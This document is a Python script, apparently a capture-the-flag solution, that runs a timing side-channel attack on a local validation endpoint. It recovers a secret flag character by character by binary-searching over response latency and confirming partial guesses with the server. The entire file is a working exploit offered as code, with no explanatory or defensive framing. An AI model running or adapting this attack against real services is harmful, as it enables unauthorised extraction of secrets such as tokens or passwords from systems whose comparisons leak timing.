import requests
import time
import statistics

# ===== CONFIGURATION =====
URL = "http://localhost:3000/api/validate"
ATTEMPTS_PER_TEST = 20      # Increased from 12
MIN_DIFF_MS = 30            # Lowered threshold (we'll use statistical significance instead)
TIMEOUT = 10

ASCII_LOW = 48
ASCII_HIGH = 95

recovered = ""

# ===== HELPER FUNCTIONS =====

def test_timing_multiple(position, byte_value, attempts):
    """
    Test timing and return both median and all samples for statistical analysis.
    """
    times = []
    
    for _ in range(attempts):
        start = time.perf_counter()
        
        try:
            r = requests.post(
                URL,
                json={
                    "position": position,
                    "checkByte": byte_value
                },
                timeout=TIMEOUT
            )
        except requests.exceptions.RequestException:
            continue
        
        end = time.perf_counter()
        times.append(end - start)
    
    if len(times) < attempts // 2:  # Need at least half successful
        return None, []
    
    return statistics.median(times), times


def compare_timings(position, value_a, value_b, attempts):
    """
    Directly compare two values and determine which is slower.
    Returns True if value_a is significantly slower than value_b.
    """
    print(f"  Comparing {value_a}('{chr(value_a)}') vs {value_b}('{chr(value_b)}')", end="")
    
    median_a, times_a = test_timing_multiple(position, value_a, attempts)
    median_b, times_b = test_timing_multiple(position, value_b, attempts)
    
    if median_a is None or median_b is None:
        print(" [RETRY]")
        return None
    
    diff_ms = (median_a - median_b) * 1000
    
    # Calculate average difference across all samples
    avg_diff = sum(times_a) / len(times_a) - sum(times_b) / len(times_b)
    avg_diff_ms = avg_diff * 1000
    
    print(f" → {median_a:.4f}s vs {median_b:.4f}s | diff: {diff_ms:+.1f}ms (avg: {avg_diff_ms:+.1f}ms)")
    
    # Use average difference for more robust decision
    return avg_diff_ms > MIN_DIFF_MS


def binary_search_char(position):
    """
    Binary search with direct comparisons between boundaries.
    """
    low = ASCII_LOW
    high = ASCII_HIGH
    
    print(f"\n{'='*70}")
    print(f"[Position {position}] Searching for character...")
    print(f"{'='*70}")
    
    iteration = 0
    
    while low < high:
        iteration += 1
        mid = (low + high + 1) // 2
        
        print(f"\n[Iteration {iteration}] Range: {low}-{high} ({high-low+1} chars) | Testing mid={mid}('{chr(mid)}')")
        
        # Direct comparison: is actual >= mid?
        result = compare_timings(position, mid, mid - 1, ATTEMPTS_PER_TEST)
        
        if result is None:
            print("  [!] Comparison failed, retrying...")
            time.sleep(1)
            continue
        
        if result:  # mid is slower → actual >= mid
            print(f"  ✓ Decision: actual >= {mid}('{chr(mid)}')")
            low = mid
        else:  # mid-1 is slower or equal → actual < mid
            print(f"  ✓ Decision: actual < {mid}('{chr(mid)}')")
            high = mid - 1
    
    found_char = chr(low)
    print(f"\n[✓✓✓] Found: '{found_char}' (ASCII {low})")
    
    # Verify with neighbors
    print(f"\n[Verification] Testing neighbors of '{found_char}'...")
    verify_before = compare_timings(position, low, low - 1, ATTEMPTS_PER_TEST) if low > ASCII_LOW else None
    verify_after = compare_timings(position, low + 1, low, ATTEMPTS_PER_TEST) if low < ASCII_HIGH else None
    
    if verify_before is False and verify_after is False:
        print(f"  [⚠️] Verification suggests '{chr(low-1)}' might be better!")
        return chr(low - 1)
    elif verify_after is True:
        print(f"  [⚠️] Verification suggests '{chr(low+1)}' might be better!")
        return chr(low + 1)
    else:
        print(f"  [✓] Verification passed!")
    
    return found_char


def verify_flag(flag):
    """Verify the complete flag."""
    try:
        r = requests.post(URL, json={"flag": flag}, timeout=TIMEOUT)
        data = r.json()
        return data.get("status"), data.get("message")
    except Exception as e:
        return None, str(e)


# ===== MAIN ATTACK =====

def main():
    global recovered
    
    print("="*70)
    print(" ENHANCED BINARY SEARCH TIMING ATTACK")
    print("="*70)
    print(f"Target: {URL}")
    print(f"Samples: {ATTEMPTS_PER_TEST} per comparison")
    print(f"Threshold: {MIN_DIFF_MS}ms")
    print("="*70)
    
    position = 0
    
    while True:
        char = binary_search_char(position)
        recovered += char
        
        print(f"\n{'='*70}")
        print(f"[PROGRESS] '{recovered}' ({len(recovered)} chars)")
        print(f"{'='*70}\n")
        
        # Verify
        print("[*] Verifying with server...")
        status, message = verify_flag(recovered)
        
        if status == "success":
            print(f"\n{'🎉'*35}")
            print(f"FLAG CAPTURED: {recovered}")
            print(f"{'🎉'*35}")
            break
        elif status == "partial":
            print(f"[✓] Correct! Continuing...\n")
            time.sleep(1)
        elif status == "error":
            print(f"[⚠️] Error: {message}")
            print(f"[⚠️] Last char might be wrong. Trying alternatives...\n")
            
            # Try adjacent characters
            last_char_code = ord(recovered[-1])
            for offset in [-1, 1, -2, 2]:
                alt_char = chr(last_char_code + offset)
                alt_flag = recovered[:-1] + alt_char
                alt_status, _ = verify_flag(alt_flag)
                if alt_status in ["success", "partial"]:
                    print(f"[✓] Correction: '{recovered[-1]}' → '{alt_char}'")
                    recovered = alt_flag
                    break
        
        position += 1
        
        if position > 30:
            print("\n[!] Max length reached")
            break
    
    print(f"\n[FINAL] {recovered} ({len(recovered)} chars)")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n[!] Interrupted")
        print(f"[!] Recovered: {recovered}")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        print(f"[!] Recovered: {recovered}")